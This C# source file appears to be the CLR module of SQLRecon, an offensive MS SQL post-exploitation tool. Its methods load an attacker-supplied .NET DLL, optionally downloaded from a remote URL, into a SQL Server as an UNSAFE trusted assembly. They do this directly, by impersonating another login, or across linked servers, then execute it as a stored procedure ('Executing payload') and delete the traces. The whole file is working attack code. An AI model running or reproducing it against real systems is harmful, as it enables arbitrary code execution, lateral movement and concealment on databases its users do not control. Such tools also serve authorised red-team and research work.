using System;
using System.Data.SqlClient;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal class CLR
    {
        private static readonly Configure _config = new();
        private static readonly PrintUtils _print = new();
        private static readonly RandomString _rs = new();
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// The Standard method loads and executes a custom .NET assembly 
        /// on a remote SQL server instance.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="dll"></param>
        /// <param name="function"></param>
        public void Standard(SqlConnection con, string dll, string function)
        {

            // First check to see if clr integration is enabled.
            string sqlOutput = _config.ModuleStatus(con, "clr enabled");

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (enableclr).", true);
                // Go no futher.
                return;
            }

            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
            string[] dllArr = _convertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }

            // Generate a new random string for the trusted hash path and the assembly name.
            string dllPath = _rs.Generate(8);
            string assem = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteQuery(con, "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
            }
            else
            {
                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
            _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
            _sqlQuery.ExecuteQuery(con, "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the custom assembly has been created
            sqlOutput = _sqlQuery.ExecuteQuery(con, "SELECT * FROM sys.assemblies where name = '" + assem + "';");

            if (sqlOutput.Contains(assem))
            {
                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }

            /* Create a stored procedure based on the function name in the DLL.
            * 
            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
            * as this will execute the query as a block. In MS SQL manager, this command
            * will need to be executed with a GO before it, and a GO after it a
            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
            */
            _print.Status(string.Format("Loading DLL into stored procedure '{0}'.", function), true);
            try
            {
                SqlCommand query = new(
                "CREATE PROCEDURE [dbo].[" + function + "]" +
                "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]", con);

                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");

            if (sqlOutput.Contains(function))
            {
                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
                _sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
                _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                // Go no futher.
                return;
            }

            // Executing new custom assembly and stored procedure.
            _print.Status("Executing payload ...", true);
            _sqlQuery.ExecuteQuery(con, "EXEC " + function);

            // Cleaning up.
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
            _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The Impersonate method loads and executes a custom .NET assembly 
        /// on a remote SQL server instance using impersonation.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="dll"></param>
        /// <param name="function"></param>
        /// <param name="impersonate"></param>
        public void Impersonate(SqlConnection con, string dll, string function, string impersonate = "null")
        {

            // First check to see if clr integration is enabled.
            string sqlOutput = _config.ModuleStatus(con, "clr enabled", impersonate);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (ienableclr).", true);
                // Go no futher.
                return;
            }

            // Get the SHA-512 hash for the DLL and convert the DLL to bytes.
            string[] dllArr = _convertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no futher.
                return;
            }

            // Generate a new random string for the trusted hash path and the assembly name.
            string dllPath = _rs.Generate(8);
            string assem = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + "; ");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
                 ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
                "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
            }
            else
            {
                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }


            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
                "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");


            // Check to see if the custom assembly has been created
            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
                "SELECT * FROM sys.assemblies where name = '" + assem + "';");

            if (sqlOutput.Contains(assem))
            {
                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }


            /* Create a stored procedure based on the function name in the DLL.
            * 
            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
            * as this will execute the query as a block. In MS SQL manager, this command
            * will need to be executed with a GO before it, and a GO after it a
            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
            */
            _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
            try
            {
                SqlCommand query = new(
                "EXECUTE AS LOGIN = '" + impersonate + "';", con);

                query.ExecuteNonQuery();

                query = new(
                    "CREATE PROCEDURE [dbo].[" + function + "]" +
                    "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]", con);
                
                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
                "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");

            if (sqlOutput.Contains(function))
            {
                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                // Go no futher.
                return;
            }

            // Executing new custom assembly and stored procedure.
            _print.Status("Executing payload ...", true);
            _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate, "EXEC " + function);

            // Cleaning up
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true); 
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The Linked method loads and executes a custom .NET assembly 
        /// on a remote linked SQL server instance
        /// </summary>
        /// <param name="con"></param>
        /// <param name="dll"></param>
        /// <param name="function"></param>
        /// <param name="linkedSqlServer"></param>
        /// <param name="sqlServer"></param>
        public void Linked(SqlConnection con, string dll, string function, string linkedSqlServer, string sqlServer)
        {
            // First check to see if rpc is enabled.
            string sqlOutput = _config.ModuleStatus(con, "rpc", "null", linkedSqlServer);
            if (!sqlOutput.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                    sqlServer, linkedSqlServer), true);
                // Go no futher.
                return;
            }

            // Then check to see if clr integration is enabled.
            sqlOutput = _config.LinkedModuleStatus(con, "clr enabled", linkedSqlServer);
            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (lenableclr).", true);
                // Go no futher.
                return;
            }

            // Get the SHA-512 hash for the DLL and convert the DLL to bytes.
            string[] dllArr = _convertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no futher.
                return;
            }

            // Generate a new random string for the trusted hash path and the assembly name.
            string dllPath = _rs.Generate(8);
            string assem = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
                    "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N''" + dllPath +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
            }
            else
            {
                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
                "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the custom assembly has been created
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.assemblies where name = ''" + assem + "'';");

            if (sqlOutput.Contains(assem))
            {
                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }

            /* Create a stored procedure based on the function name in the DLL.
             * 
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
             *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
             */

            _print.Status(string.Format("Loading DLL into stored procedure '{0}'.", function), true);
            try
            {
                SqlCommand query = new("EXECUTE ('" +
                    "CREATE PROCEDURE [dbo].[" + function + "]" +
                    "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]" +
                    "') AT " + linkedSqlServer + ";", con);
                
                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = ''PC'';");

            if (sqlOutput.Contains(function))
            {
                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                // Go no futher.
                return;

            }

            // Cxecuting new custom assembly and stored procedure.
            _print.Status("Executing payload ...", true);
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC " + function);

            // Cleaning up.
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The _convertDLLToSQLBytesFile method will take a .NET assembly on disk and covert it
        /// to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private string[] _convertDLLToSQLBytesFile(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            // Read the DLL, create a SHA-512 hash for it and convert the DLL to SQL compatible bytes.
            try
            {
                FileInfo fileInfo = new FileInfo(dll);
                _print.Status(string.Format("{0} is {1} bytes, this will take a minute ...", dll, fileInfo.Length), true);

                // Get the SHA-512 hash of the DLL so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using (SHA512 SHA512 = SHA512Managed.Create())
                {
                    using (FileStream fileStream = System.IO.File.OpenRead(dll))
                    {
                        foreach (var hash in SHA512.ComputeHash(fileStream))
                        {
                            dllHash += hash.ToString("x2");
                        }
                    }
                }

                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in File.ReadAllBytes(dll))
                {
                    dllBytes += b.ToString("X2");
                }

            }
            catch (FileNotFoundException)
            {
                _print.Error(string.Format("Unable to load {0}", dll), true);
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// The _convertDLLToSQLByteWeb method will download a .NET assembly from a remote HTTP/s
        /// location and covert it to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private string[] _convertDLLToSQLBytesWeb(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            try
            {
                // Get the SHA-512 hash of the DLL so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using (SHA512 SHA512 = SHA512Managed.Create())
                {
                    using (var client = new WebClient())
                    {
                        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                        _print.Status(string.Format("Downloading DLL from {0}", dll), true);

                        var content = client.DownloadData(dll);

                        using (var stream = new MemoryStream(content))
                        {
                            BinaryReader reader = new BinaryReader(stream);
                            byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
                            stream.Close();
                            reader.Close();

                            _print.Status(string.Format("DLL is {0} bytes, this will take a minute ...", dllByteArray.Length), true);

                            foreach (var hash in SHA512.ComputeHash(dllByteArray))
                            {
                                dllHash += hash.ToString("x2");
                            }
                            // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                            foreach (Byte b in dllByteArray)
                            {
                                dllBytes += b.ToString("X2");
                            }
                        }
                    }

                }
            }
            catch (Exception ex)
            {
                _print.Error(string.Format("Unable to download DLL from {0}", ex), true);
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// The _convertDLLToSQLBytes method determines if the .NET assembly resides locally
        /// on disk, or remotely on a web server.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private string[] _convertDLLToSQLBytes(string dll)
        {
            string[] dllArr = new string[2];

            // Logic to determine if the DLL is being read from disk or web.
            dllArr = (dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://"))
            ? _convertDLLToSQLBytesWeb(dll)
            : _convertDLLToSQLBytesFile(dll);

            return dllArr;
        }
    }
}